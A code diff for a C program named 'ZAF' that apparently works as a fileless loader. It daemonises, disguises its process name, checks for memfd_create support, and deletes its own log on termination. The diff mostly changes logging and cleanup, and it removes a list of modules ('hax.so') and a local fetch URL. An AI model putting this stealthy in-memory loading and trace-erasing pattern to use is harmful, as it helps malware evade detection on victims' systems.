@@ -48,9 +48,9 @@ inline int memfd_create(const char *name, unsigned int flags) {
 int checKernel() {
 
 	struct utsname buffer;
-	char *token;
-	char *separator = ".";
-    int memfdcheck;
+	char   *token;
+	char   *separator = ".";
+    int    memfdcheck;
 	
 
     if (uname(&buffer) != 0) {
@@ -241,15 +241,16 @@ int main (int argc, char **argv) {
     argv = save_ps_display_args(argc, argv);
     init_ps_display("zaf");
 
-    log_debug("Main: Opening log file: %s", logFile);
     fp = fopen (logFile,"w");
     if (fp == NULL) {
-        log_error("Main: File not created okay, errno = %d", errno);
+        log_error("ZAF: Log File not created okay, errno = %d", errno);
     }else{
         log_set_fp(fp); 
+        log_set_level(2); //  "TRACE", "DEBUG", >"INFO"<, "WARN", "ERROR", "FATAL"
         log_set_quiet(logquiet);
     }
 
+	log_info("=== ZAF ===\n");
     backgroundDaemonLeader();
 
     //load_so(fd, fd_s);
@@ -259,15 +260,9 @@ int main (int argc, char **argv) {
 
 void doWork(){
 
-    char *modules[] = {
-        "hax.so",
-        "libmctor.so"
-    };
-    char *ccurl="http://127.0.0.1:8080/";
     char urlbuf[255] = {'\0'};
 	int fd, i;
 
-	log_debug("\n\n=== ZAF ===\n");
 
     if (checKernel() == 1){
 	    log_info("Worker: memfd_create() support seems to be available.");
@@ -355,7 +350,7 @@ int backgroundDaemonLeader(){
     setSignalHandlers();
     log_debug("Daemon: after signal handlers");
 
-    log_debug("Dameon: before doWork()");
+    log_debug("Daemon: before doWork()");
     doWork();
 
     return 0;
@@ -619,17 +614,19 @@ void doSigHup(void){
 
 void doSigUsr1(void){
     sigflag = 0; // check or reset
+    log_debug("== Stats: \tPID: %d, Log: %s ==", getpid(), logFile);
     log_debug("Executing SIGUSR1 code here ...");
 }
 void doSigUsr2(void){
     sigflag = 0; // check or reset
     log_debug("Executing SIGUSR2 code here ...");
+    log_set_level(1); // increase logging to DEBUG
 }
 void doSigInt(void){
     sigflag = 0; // check or reset
     log_debug("Executing SIGINT code here ...");
     log_debug("=== ZAF down ===");
-    cleanup(1); // leave log intact
+    cleanup(0); // leave log intact
     exit(0);
 }
 void doSigTerm(void){
@@ -638,18 +635,19 @@ void doSigTerm(void){
     log_debug("=== ZAF down ===");
     // - logrotate log
     // - Send log offsite
-    cleanup(0); // remove log
+    cleanup(1); // remove log
     exit(0);
 }
 
-void cleanup(int leaveLog){
+void cleanup(int cleanLog){
     struct stat sb;
 
     fclose(fp);
 
-    if (! leaveLog) {
-        if (lstat(logFile, &sb))
+    if (cleanLog) {
+        if (lstat(logFile, &sb) != -1){
             unlink(logFile);
+        }
     }
 }
 
